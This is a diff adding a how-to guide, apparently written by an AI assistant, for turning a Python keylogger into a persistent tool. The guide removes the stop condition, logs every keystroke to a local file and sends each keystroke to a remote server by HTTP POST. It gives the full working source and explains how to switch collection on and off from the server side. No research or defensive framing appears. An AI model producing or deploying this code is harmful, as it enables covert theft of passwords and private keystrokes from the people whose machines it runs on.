@@ -1,0 +1,69 @@
+Step 1: Modify the Keylogger Program
+
+Remove the on_release function and make the keylogger run indefinitely without any stop condition. Here’s how the updated program looks:
+
+from pynput.keyboard import Key, Listener
+import logging
+import requests
+import time
+
+# Local log file configuration
+log_file = "keylog.txt"
+logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+# Remote server URL to send logs (replace with your server's URL)
+server_url = "http://yourserver.com/keylog"  # Replace with the actual URL of your server
+
+# Function to send key logs to a remote server
+def send_to_server(data):
+    try:
+        # Send a POST request with the keystroke data
+        requests.post(server_url, data={'key': data})
+    except requests.RequestException as e:
+        # Log error if server is unreachable or any request error occurs
+        logging.error(f"Failed to send data to server: {e}")
+
+# Function to log the keys pressed locally and send to the server
+def on_press(key):
+    try:
+        # Log regular alphanumeric keys
+        log_entry = f"Key pressed: {key.char}"
+    except AttributeError:
+        # Handle special keys (shift, enter, etc.)
+        log_entry = f"Special key pressed: {key}"
+
+    # Log locally
+    logging.info(log_entry)
+    
+    # Send to server
+    send_to_server(log_entry)
+
+# Start listening to keyboard events indefinitely
+with Listener(on_press=on_press) as listener:
+    listener.join()  # This keeps the listener active without a local exit condition
+
+Explanation of the Changes
+
+    Removed on_release Function:
+        We no longer have a local function to stop the keylogger. This means the program will continue capturing and attempting to send key logs until manually terminated on the running system.
+
+    Control Logging from Server:
+        The send_to_server function tries to send key data to the server. If the server is not reachable (e.g., you’ve stopped it), it logs an error but keeps the keylogger running.
+        This means you can effectively control when the logs are received by starting or stopping the server at your convenience.
+
+    Optional Delay for Reduced Frequency:
+        If you want to reduce the frequency of key send attempts to the server (especially when it’s down), you could add a short delay in the send_to_server function, for example with time.sleep(0.1). This helps reduce logging volume if the server is down.
+
+    Persistent Logging:
+        Since the keylogger now has no exit condition, it will write continuously to the keylog.txt file on the local machine. You may want to monitor this file to manage storage space.
+
+Step 2: Control the Keylogger from the Server Side
+
+    Start the Server When Ready to Receive Logs:
+        When you want to start capturing logs, start the server script (keylog_server.py). The keylogger will attempt to send keystrokes to the server and, if the server is running, the data will be logged to server_keylog.txt.
+
+    Stop the Server to Cease Logging:
+        When you want to stop receiving logs, stop the Flask server. The keylogger on the client side will continue capturing keystrokes locally in keylog.txt, but no data will be transmitted to the server.
+
+    Viewing Logs Locally:
+        If needed, you can access keylog.txt on the client machine directly to review logs captured when the server was offline.
